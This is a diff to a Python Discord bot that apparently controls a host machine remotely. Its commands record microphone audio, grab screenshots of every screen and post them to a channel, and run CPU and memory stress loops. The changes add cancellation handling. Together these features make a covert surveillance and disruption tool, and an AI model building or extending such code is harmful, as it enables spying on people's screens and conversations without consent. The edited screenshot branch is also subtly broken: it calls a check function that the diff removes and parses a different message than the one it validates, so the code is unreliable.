@@ -31,6 +31,8 @@ print(f"Token value: {token}")
 timeout = 1
 command_mode = False
 
+
+
 async def wifi_check():
     while True:
         try:
@@ -45,6 +47,11 @@ async def wifi_check():
 asyncio.run(wifi_check())
 
 class MyClient(discord.Client):
+    
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.cancelled = False
+
     async def on_disconnect(self):
         print("Bot disconnected from Discord (possible internet loss).")
 
@@ -62,12 +69,20 @@ class MyClient(discord.Client):
         if message.author == self.user:
             return
         try:
-            # rec - Record audio
+            
             if not command_mode:
                 if f'{message.content}' == 'cmdtoggle':
                    command_mode = True
                    await message.channel.send('Command mode enabled. Type "cmdtoggle" again to disable.')
                 
+                if message.content == 'cancel':
+                    self.cancelled = True
+                    await message.channel.send('Operation cancelled')
+                    await asyncio.sleep(3)  # Give some time for ongoing operations to check the flag
+                    self.cancelled = False # Reset for future operations
+                    return
+                    
+
                 if message.content == 'rec':
                     def check(m):
                         return m.author == message.author and m.channel == message.channel
@@ -107,6 +122,9 @@ class MyClient(discord.Client):
                     await message.channel.send(f'Recording for {record_seconds} seconds...')
                     frames = []
                     for _ in range(0, int(rate / chunk * record_seconds)):
+                        if self.cancelled:
+                            await message.channel.send('Recording operation cancelled.')
+                            break
                         data = stream.read(chunk)
                         frames.append(data)
 
@@ -140,13 +158,20 @@ class MyClient(discord.Client):
                     await self.change_presence(activity=discord.Game(name="Updating..."))
 
                 # scr - Take a screenshot
-                if message.content == 'scr':
-                    await message.channel.send('Please enter the amount of screenshots you would like to take')
-                    def check(m):
-                        return m.author == message.author and m.channel == message.channel
+                if startswith := message.content.startswith('scr'):
+                    
+                    
                     msg = await self.wait_for('message', check=check)
-                    amount = int(msg.content)
+                    if not msg.content[4:].strip().isdigit():
+                        await message.channel.send('Please enter a valid number')
+                        return
+                    amount = int(msg.content.strip()[4:].strip())
+                    #send a error message if amount is not a number
+                    
                     for i in range(amount):
+                        if self.cancelled:
+                            await message.channel.send('Screenshot operation cancelled.')
+                            break
                         im = ImageGrab.grab(all_screens=True)
                         im.save('screenshot.png')
                         await message.channel.send(file=discord.File('screenshot.png'))
@@ -211,6 +236,9 @@ class MyClient(discord.Client):
                             def cpu_stress():
                                 end_time = time.time() + duration
                                 while time.time() < end_time:
+                                    if self.cancelled:
+                                        client.loop.create_task(message.channel.send('Lag operation cancelled.'))
+                                        break
                                     pass
 
                             def memory_stress():
@@ -417,8 +445,11 @@ class MyClient(discord.Client):
 
                 
 
+        except asyncio.CancelledError:
+            await message.channel.send("Operation cancelled by user.")
         except Exception as e:
             await message.channel.send(f"An error occurred: {e}")
+
 
 intents = discord.Intents.default()
 intents.message_content = True
